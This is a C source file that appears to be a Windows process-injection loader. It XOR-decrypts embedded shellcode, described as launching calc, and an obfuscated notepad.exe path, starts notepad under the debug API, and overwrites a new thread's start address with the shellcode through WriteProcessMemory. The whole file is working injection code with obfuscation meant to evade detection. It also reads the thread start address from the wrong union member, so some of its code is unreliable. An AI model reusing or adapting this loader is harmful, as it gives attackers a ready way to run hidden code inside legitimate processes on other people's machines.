#include <Windows.h>
#include <stdio.h>

#define XOR_KEY 0x5A
#define TARGET_PROCESS_PATH L"C:\\Windows\\System32\\notepad.exe"
#define GET_FILENAMEW(PATH) (wcsrchr((PATH), L'/') ? wcsrchr((PATH), L'/') + 1 : (wcsrchr((PATH), L'\\') ? wcsrchr((PATH), L'\\') + 1 : (PATH)))

// Encrypted shellcode (generated by XORing RawX64CalcShellcode with XOR_KEY)
const unsigned char EncryptedShellcode[] = {
    0xA6, 0x12, 0xD9, 0xBE, 0xAA, 0xB2, 0x9A, 0x5A, 0x5A, 0x5A, 0x1B, 0x0B,
    0x1B, 0x0A, 0x08, 0x0B, 0x0C, 0x12, 0x6B, 0x88, 0x3F, 0x12, 0xD1, 0x08,
    0x3A, 0x12, 0xD1, 0x08, 0x42, 0x12, 0xD1, 0x08, 0x7A, 0x12, 0xD1, 0x28,
    0x0A, 0x12, 0x55, 0xED, 0x10, 0x10, 0x17, 0x6B, 0x93, 0x12, 0x6B, 0x9A,
    0xF6, 0x66, 0x3B, 0x26, 0x58, 0x76, 0x7A, 0x1B, 0x9B, 0x93, 0x57, 0x1B,
    0x5B, 0x9B, 0xB8, 0xB7, 0x08, 0x1B, 0x0B, 0x12, 0xD1, 0x08, 0x7A, 0xD1,
    0x18, 0x66, 0x12, 0x5B, 0x8A, 0xD1, 0xDA, 0xD2, 0x5A, 0x5A, 0x5A, 0x12,
    0xDF, 0x9A, 0x2E, 0x3D, 0x12, 0x5B, 0x8A, 0x0A, 0xD1, 0x12, 0x42, 0x1E,
    0xD1, 0x1A, 0x7A, 0x13, 0x5B, 0x8A, 0xB9, 0x0C, 0x12, 0xA5, 0x93, 0x1B,
    0xD1, 0x6E, 0xD2, 0x12, 0x5B, 0x8C, 0x17, 0x6B, 0x93, 0x12, 0x6B, 0x9A,
    0xF6, 0x1B, 0x9B, 0x93, 0x57, 0x1B, 0x5B, 0x9B, 0x62, 0xBA, 0x2F, 0xAB,
    0x16, 0x59, 0x16, 0x7E, 0x52, 0x1F, 0x63, 0x8B, 0x2F, 0x82, 0x02, 0x1E,
    0xD1, 0x1A, 0x7E, 0x13, 0x5B, 0x8A, 0x3C, 0x1B, 0xD1, 0x56, 0x12, 0x1E,
    0xD1, 0x1A, 0x46, 0x13, 0x5B, 0x8A, 0x1B, 0xD1, 0x5E, 0xD2, 0x12, 0x5B,
    0x8A, 0x1B, 0x02, 0x1B, 0x02, 0x04, 0x03, 0x00, 0x1B, 0x02, 0x1B, 0x03,
    0x1B, 0x00, 0x12, 0xD9, 0xB6, 0x7A, 0x1B, 0x08, 0xA5, 0xBA, 0x02, 0x1B,
    0x03, 0x00, 0x12, 0xD1, 0x48, 0xB3, 0x0D, 0xA5, 0xA5, 0xA5, 0x07, 0x12,
    0xE0, 0x5B, 0x5A, 0x5A, 0x5A, 0x5A, 0x5A, 0x5A, 0x5A, 0x12, 0xD7, 0xD7,
    0x5B, 0x5B, 0x5A, 0x5A, 0x1B, 0xE0, 0x6B, 0xD1, 0x35, 0xDD, 0xA5, 0x8F,
    0xE1, 0xBA, 0x47, 0x70, 0x50, 0x1B, 0xE0, 0xFC, 0xCF, 0xE7, 0xC7, 0xA5,
    0x8F, 0x12, 0xD9, 0x9E, 0x72, 0x66, 0x5C, 0x26, 0x50, 0xDA, 0xA1, 0xBA,
    0x2F, 0x5F, 0xE1, 0x1D, 0x49, 0x28, 0x35, 0x30, 0x5A, 0x03, 0x1B, 0xD3,
    0x80, 0xA5, 0x8F, 0x39, 0x3B, 0x36, 0x39, 0x5A
};

// Encrypted target process path (generated by XORing TARGET_PROCESS_PATH with XOR_KEY)
const WCHAR EncryptedTargetPath[] = {
    0x0019, 0x0060, 0x0006, 0x000D, 0x0033, 0x0034, 0x003E, 0x0035, 0x002D, 0x0029,
    0x0006, 0x0009, 0x0023, 0x0029, 0x002E, 0x003F, 0x0037, 0x0069, 0x0068, 0x0006,
    0x0034, 0x0035, 0x002E, 0x003F, 0x002A, 0x003B, 0x003E, 0x0074, 0x003F, 0x0022,
    0x003F, 0x005A
};

// Function to XOR-decrypt a byte array in place
void XorDecryptBytes(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Function to XOR-decrypt a wide string in place
void XorDecryptWString(WCHAR* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int main() {
    STARTUPINFOW StartupInfo = { .cb = sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION ProcessInfo = { 0 };
    DEBUG_EVENT DebugEvent = { 0 };
    SIZE_T sNumberOfBytesWritten = 0x00;

    // Decrypt shellcode
    unsigned char* DecryptedShellcode = (unsigned char*)malloc(sizeof(EncryptedShellcode));
    if (!DecryptedShellcode) {
        printf("[!] Memory allocation for shellcode failed\n");
        return -1;
    }
    memcpy(DecryptedShellcode, EncryptedShellcode, sizeof(EncryptedShellcode));
    XorDecryptBytes(DecryptedShellcode, sizeof(EncryptedShellcode), XOR_KEY);

    // Decrypt target process path
    WCHAR* szTargetProcess = (WCHAR*)malloc(sizeof(EncryptedTargetPath));
    if (!szTargetProcess) {
        printf("[!] Memory allocation for target path failed\n");
        free(DecryptedShellcode);
        return -1;
    }
    memcpy(szTargetProcess, EncryptedTargetPath, sizeof(EncryptedTargetPath));
    XorDecryptWString(szTargetProcess, sizeof(EncryptedTargetPath) / sizeof(WCHAR), XOR_KEY);

    // Create process
    if (!CreateProcessW(szTargetProcess, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &StartupInfo, &ProcessInfo)) {
        printf("[!] CreateProcessW Failed With Error: %d \n", GetLastError());
        free(DecryptedShellcode);
        free(szTargetProcess);
        return -1;
    }

    printf("[i] %ws Process Created With PID: %d \n", GET_FILENAMEW(szTargetProcess), ProcessInfo.dwProcessId);

    // Parsing all debug events
    while (WaitForDebugEvent(&DebugEvent, INFINITE)) {
        switch (DebugEvent.dwDebugEventCode) {
        case CREATE_THREAD_DEBUG_EVENT:
            printf("[+] Targeting Thread: %d\n", GetThreadId(DebugEvent.u.CreateThread.hThread));
            printf("[i] Writing Shellcode At Thread's Start Address: 0x%p \n", DebugEvent.u.CreateProcessInfo.lpStartAddress);

            if (!WriteProcessMemory(ProcessInfo.hProcess, DebugEvent.u.CreateProcessInfo.lpStartAddress, DecryptedShellcode, sizeof(EncryptedShellcode), &sNumberOfBytesWritten) || sNumberOfBytesWritten != sizeof(EncryptedShellcode)) {
                printf("[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
                printf("[i] Wrote %d Of %d Bytes \n", (int)sNumberOfBytesWritten, (int)sizeof(EncryptedShellcode));
                free(DecryptedShellcode);
                free(szTargetProcess);
                return -1;
            }

            if (!DebugActiveProcessStop(ProcessInfo.dwProcessId)) {
                printf("[!] DebugActiveProcessStop Failed With Error: %d \n", GetLastError());
                free(DecryptedShellcode);
                free(szTargetProcess);
                return -1;
            }

            // Resume thread creation
            ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
            goto _END_OF_FUNC;

        case EXIT_PROCESS_DEBUG_EVENT:
            printf("[i] Remote Process Terminated \n");
            free(DecryptedShellcode);
            free(szTargetProcess);
            return 0;

        default:
            break;
        }

        ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
    }

_END_OF_FUNC:
    free(DecryptedShellcode);
    free(szTargetProcess);
    CloseHandle(ProcessInfo.hProcess);
    CloseHandle(ProcessInfo.hThread);
    return 0;
}
